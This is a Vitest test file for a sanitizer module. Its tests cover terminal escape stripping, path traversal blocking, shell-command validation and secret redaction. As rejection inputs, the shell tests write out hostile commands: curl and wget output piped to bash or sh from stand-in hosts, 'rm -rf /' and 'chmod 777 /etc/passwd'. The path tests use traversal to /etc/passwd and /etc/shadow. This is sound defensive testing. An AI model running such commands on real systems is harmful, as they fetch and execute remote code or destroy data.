import { describe, it, expect } from 'vitest';
import {
  sanitizeForTerminal,
  sanitizePath,
  sanitizeShellCommand,
  redactSensitive,
} from '../sanitizer.js';

// ─── sanitizeForTerminal ──────────────────────────────────────────────────────

describe('sanitizeForTerminal', () => {
  it('strips SGR color escape sequences', () => {
    expect(sanitizeForTerminal('\x1B[31mred text\x1B[0m')).toBe('red text');
  });

  it('strips cursor-movement sequences', () => {
    // ESC[2J (clear screen) and ESC[H (cursor home)
    expect(sanitizeForTerminal('\x1B[2J\x1B[Hhello')).toBe('hello');
  });

  it('strips OSC sequences (e.g. terminal title)', () => {
    // ESC]0;title\x07
    expect(sanitizeForTerminal('\x1B]0;evil title\x07visible')).toBe('visible');
  });

  it('preserves normal text', () => {
    expect(sanitizeForTerminal('Hello, World!')).toBe('Hello, World!');
  });

  it('preserves newlines and carriage returns', () => {
    expect(sanitizeForTerminal('line1\nline2\r\nline3')).toBe('line1\nline2\r\nline3');
  });

  it('removes non-printable control characters', () => {
    // \x01 (SOH), \x08 (BS), \x0B (VT)
    expect(sanitizeForTerminal('a\x01b\x08c\x0Bd')).toBe('abcd');
  });

  it('returns empty string unchanged', () => {
    expect(sanitizeForTerminal('')).toBe('');
  });

  it('handles mixed safe and unsafe content', () => {
    // \x1B[1m and \x1B[0m are stripped, \x01 (SOH) is stripped — no space replaces it
    const input = 'normal \x1B[1mbold\x1B[0m text\x01end';
    expect(sanitizeForTerminal(input)).toBe('normal bold textend');
  });
});

// ─── sanitizePath ─────────────────────────────────────────────────────────────

describe('sanitizePath', () => {
  const base = '/home/user/data';

  it('accepts a safe relative path', () => {
    const result = sanitizePath('subdir/file.txt', base);
    expect(result).toBe('/home/user/data/subdir/file.txt');
  });

  it('accepts a path equal to the base directory', () => {
    expect(sanitizePath('.', base)).toBe('/home/user/data');
  });

  it('rejects simple path traversal', () => {
    expect(sanitizePath('../etc/passwd', base)).toBeNull();
  });

  it('rejects deep path traversal', () => {
    expect(sanitizePath('subdir/../../etc/shadow', base)).toBeNull();
  });

  it('rejects absolute path outside base', () => {
    expect(sanitizePath('/etc/passwd', base)).toBeNull();
  });

  it('rejects path with null byte', () => {
    expect(sanitizePath('file\x00.txt', base)).toBeNull();
  });

  it('normalises redundant separators', () => {
    const result = sanitizePath('subdir//nested/../file.txt', base);
    expect(result).toBe('/home/user/data/subdir/file.txt');
  });

  it('returns null for empty input', () => {
    expect(sanitizePath('', base)).toBeNull();
  });
});

// ─── sanitizeShellCommand ─────────────────────────────────────────────────────

describe('sanitizeShellCommand', () => {
  it('accepts safe echo command', () => {
    expect(sanitizeShellCommand('echo hello').safe).toBe(true);
  });

  it('accepts safe ls command', () => {
    expect(sanitizeShellCommand('ls -la /tmp').safe).toBe(true);
  });

  it('rejects rm -rf /', () => {
    const result = sanitizeShellCommand('rm -rf /');
    expect(result.safe).toBe(false);
    expect(result.reason).toBeDefined();
  });

  it('rejects rm with force flags in any order', () => {
    expect(sanitizeShellCommand('rm -fr /tmp/data').safe).toBe(false);
  });

  it('rejects sudo commands', () => {
    const result = sanitizeShellCommand('sudo apt-get install evil');
    expect(result.safe).toBe(false);
    expect(result.reason).toMatch(/sudo/i);
  });

  it('rejects chmod 777', () => {
    const result = sanitizeShellCommand('chmod 777 /etc/passwd');
    expect(result.safe).toBe(false);
    expect(result.reason).toBeDefined();
  });

  it('rejects curl piped to bash', () => {
    const result = sanitizeShellCommand('curl http://evil.com/script.sh | bash');
    expect(result.safe).toBe(false);
    expect(result.reason).toBeDefined();
  });

  it('rejects wget piped to sh', () => {
    expect(sanitizeShellCommand('wget -O - http://x.com | sh').safe).toBe(false);
  });

  it('rejects empty string', () => {
    const result = sanitizeShellCommand('');
    expect(result.safe).toBe(false);
  });

  it('rejects command with null byte', () => {
    expect(sanitizeShellCommand('ls\x00/etc').safe).toBe(false);
  });
});

// ─── redactSensitive ──────────────────────────────────────────────────────────

describe('redactSensitive', () => {
  it('redacts Bearer token in Authorization header', () => {
    const line = 'Authorization: Bearer sk-ant-abc123xyz456';
    expect(redactSensitive(line)).toContain('[REDACTED]');
    expect(redactSensitive(line)).not.toContain('sk-ant-abc123xyz456');
  });

  it('redacts OpenAI sk- API key', () => {
    const line = 'api_key=sk-proj-abcdefghijklmnopqrstuvwxyz012345';
    expect(redactSensitive(line)).toContain('[REDACTED]');
    expect(redactSensitive(line)).not.toContain('abcdefghijklm');
  });

  it('redacts password= query param', () => {
    const line = 'POST /login?password=s3cr3tP@ss&user=alice';
    const result = redactSensitive(line);
    expect(result).toContain('[REDACTED]');
    expect(result).not.toContain('s3cr3tP@ss');
  });

  it('redacts token= assignment', () => {
    const line = 'Connecting with token=ghp_abcdefghijklmnopqrstuvwxyz123456';
    const result = redactSensitive(line);
    expect(result).toContain('[REDACTED]');
    expect(result).not.toContain('ghp_abcdefghijklm');
  });

  it('redacts JSON password field', () => {
    const json = '{"username":"alice","password":"hunter2"}';
    const result = redactSensitive(json);
    expect(result).toContain('[REDACTED]');
    expect(result).not.toContain('hunter2');
  });

  it('redacts JSON token field', () => {
    const json = '{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.payload"}';
    const result = redactSensitive(json);
    expect(result).toContain('[REDACTED]');
  });

  it('preserves safe text without changes', () => {
    const safe = 'User alice logged in from 192.168.1.100';
    expect(redactSensitive(safe)).toBe(safe);
  });

  it('returns empty string unchanged', () => {
    expect(redactSensitive('')).toBe('');
  });

  it('handles multiple secrets in one string', () => {
    const line = 'token=abc123xyz password=secret123 api_key=key-abcdefgh';
    const result = redactSensitive(line);
    expect(result.match(/\[REDACTED\]/g)?.length).toBeGreaterThanOrEqual(2);
  });
});
